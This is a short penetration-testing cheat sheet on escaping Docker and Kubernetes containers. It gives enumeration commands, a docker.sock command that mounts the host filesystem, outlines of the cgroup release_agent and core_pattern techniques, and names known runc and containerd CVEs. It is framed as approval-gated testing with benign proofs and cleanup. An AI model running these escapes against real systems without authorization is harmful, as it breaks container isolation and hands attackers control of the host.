# Container escape reference
# Post-ex, approval-gated. Benign host proof (read a host marker / host-ns id). No persistence/destruction. Cleanup.

## Am I in a container? + enumerate
```
ls -la /.dockerenv ; cat /proc/1/cgroup ; cat /proc/self/status | grep -i cap
amicontained ; capsh --print ; mount ; ls -la /dev ; ls -la /var/run/docker.sock
```

## Escape vectors (benign proof per vector)
```
## 1. --privileged (or cap_sys_admin) -> cgroup release_agent
#   mount a cgroup, set release_agent to a script on the host-visible fs, trigger notify_on_release.
#   Benign: have the release_agent write `id > /host_marker` and read it back. (Classic release_agent PoC.)

## 2. mounted docker.sock  (/var/run/docker.sock present)
docker -H unix:///var/run/docker.sock run -v /:/host --rm -it alpine \
   sh -c 'cat /host/etc/hostname'        # = the NODE hostname (benign host read). Remove the helper container.

## 3. hostPath / host mount visible
ls /host* / mnt ; read a host file through the mount (benign marker).

## 4. cap_sys_admin + no apparmor -> mount host disk / core_pattern
#   core_pattern: write `|/proc/%P/...` handler (host) ; crash a process to trigger. (Advanced; feasibility on prod.)

## 5. Exposed device (/dev/sda*) -> debugfs read-only (prove host fs read)

## 6. Privileged + kernel -> known runc/containerd CVEs (CVE-2019-5736 runc, CVE-2022-0492 cgroups,
#      Leaky Vessels CVE-2024-21626). HIGH RISK — feasibility-first; run only with approval.
```

## Proof + cleanup
Prove host access by reading a file that only exists on the HOST (node hostname, a planted host marker) or
running in the host namespace. Record + remove any helper container/file (`cleanup.md`). No persistence.
Hand the host foothold to `linux-privesc`. Tools: `deepce`, `amicontained`, CDK.
